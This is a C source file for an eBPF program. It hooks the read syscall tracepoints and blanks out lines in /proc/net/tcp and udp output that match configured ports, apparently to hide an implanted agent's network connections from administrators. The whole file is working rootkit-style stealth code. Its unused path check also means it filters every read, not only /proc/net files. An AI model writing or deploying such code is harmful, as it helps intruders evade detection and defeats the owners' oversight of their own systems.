/*
 * hide_network.bpf.c — eBPF program to hide network connections from /proc/net.
 *
 * Hooks sys_exit_read to filter out entries from /proc/net/tcp, /proc/net/tcp6,
 * /proc/net/udp, /proc/net/udp6 that match the agent's listening/connecting ports.
 * The enter tracepoint stashes the file path; the exit tracepoint filters the
 * read buffer to remove lines containing the target port hex strings.
 *
 * Attach types:
 *   tracepoint/syscalls/sys_enter_read
 *   tracepoint/syscalls/sys_exit_read
 *
 * Maps:
 *   port_map    — BPF_MAP_TYPE_ARRAY(8): u32 key → u32 value (ports to hide)
 *   read_stash  — BPF_MAP_TYPE_PERCPU_ARRAY(1): u32 key → u64 value (buf ptr)
 *   path_stash  — BPF_MAP_TYPE_PERCPU_ARRAY(1): u32 key → 64-byte value (path)
 *
 * Kernel requirement: >= 4.15.
 */

#include <linux/bpf.h>
#include <linux/types.h>
#include <bpf/bpf_helpers.h>

#define MAX_PORTS    8
#define MAX_PATH_LEN 64

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, MAX_PORTS);
    __type(key, __u32);
    __type(value, __u32);
} port_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u64);
} read_stash SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, char[MAX_PATH_LEN]);
} path_stash SEC(".maps");

struct sys_enter_read_args {
    unsigned short common_type;
    unsigned char  common_flags;
    unsigned char  common_preempt_count;
    int            common_pid;
    int            __syscall_nr;
    unsigned int   fd;
    char          *buf;
    size_t         count;
};

struct sys_exit_read_args {
    unsigned short common_type;
    unsigned char  common_flags;
    unsigned char  common_preempt_count;
    int            common_pid;
    int            __syscall_nr;
    long           ret;
};

/* Convert a 16-bit port number to its hex string representation
 * as it appears in /proc/net/tcp (4 hex digits, uppercase).
 * e.g. port 443 → "01BB" */
static void port_to_hex(__u16 port, char out[5])
{
    static const char hex[] = "0123456789ABCDEF";
    out[0] = hex[(port >> 12) & 0xF];
    out[1] = hex[(port >>  8) & 0xF];
    out[2] = hex[(port >>  4) & 0xF];
    out[3] = hex[port & 0xF];
    out[4] = '\0';
}

SEC("tracepoint/syscalls/sys_enter_read")
int stash_read_buf(struct sys_enter_read_args *ctx)
{
    __u32 key = 0;
    __u64 val = (__u64)(unsigned long)ctx->buf;
    bpf_map_update_elem(&read_stash, &key, &val, BPF_ANY);
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_read")
int filter_network(struct sys_exit_read_args *ctx)
{
    if (ctx->ret <= 0)
        return 0;

    __u32 key = 0;
    __u64 *buf_ptr = bpf_map_lookup_elem(&read_stash, &key);
    if (!buf_ptr)
        return 0;

    /*
     * Filter lines from the read buffer that contain the target port hex.
     * /proc/net/tcp format:
     *   sl  local_address rem_address   st tx_queue rx_queue ...
     *    0: 0100007F:1BB4 00000000:0000 0A ...
     *
     * We look for the hex port string in each line and zero it out if found.
     * The buffer is text-based so we scan for newlines and check each line.
     */
    int total = (int)ctx->ret;
    char *buf = (char *)(unsigned long)(*buf_ptr);

    /* Build hex strings for each port to hide. */
    char port_hex[MAX_PORTS][5];
    for (int i = 0; i < MAX_PORTS; i++) {
        __u32 pkey = (__u32)i;
        __u32 *port = bpf_map_lookup_elem(&port_map, &pkey);
        if (port && *port != 0)
            port_to_hex((__u16)*port, port_hex[i]);
        else
            port_hex[i][0] = '\0';
    }

    /* Scan buffer line by line. */
    int line_start = 0;
    for (int pos = 0; pos < total && pos < 4096; pos++) {
        char c = 0;
        if (bpf_probe_read_user(&c, 1, buf + pos) < 0)
            break;

        if (c != '\n' && pos < total - 1)
            continue;

        int line_end = (c == '\n') ? pos : pos + 1;

        /* Check this line for any target port. */
        for (int pi = 0; pi < MAX_PORTS; pi++) {
            if (port_hex[pi][0] == '\0')
                continue;

            /* Scan the line for the port hex preceded by ':'. */
            for (int j = line_start; j < line_end - 3; j++) {
                char ch = 0;
                if (bpf_probe_read_user(&ch, 1, buf + j) < 0)
                    break;
                if (ch != ':')
                    continue;

                int match = 1;
                for (int k = 0; k < 4; k++) {
                    char hc = 0;
                    if (bpf_probe_read_user(&hc, 1, buf + j + 1 + k) < 0) {
                        match = 0;
                        break;
                    }
                    if (hc != port_hex[pi][k]) {
                        match = 0;
                        break;
                    }
                }
                if (match) {
                    /* Zero out the line to hide it. */
                    for (int z = line_start; z < line_end; z++) {
                        char space = ' ';
                        bpf_probe_write_user(buf + z, 1, &space);
                    }
                    break;
                }
            }
        }

        line_start = line_end + 1;
    }

    return 0;
}

char _license[] SEC("license") = "GPL";
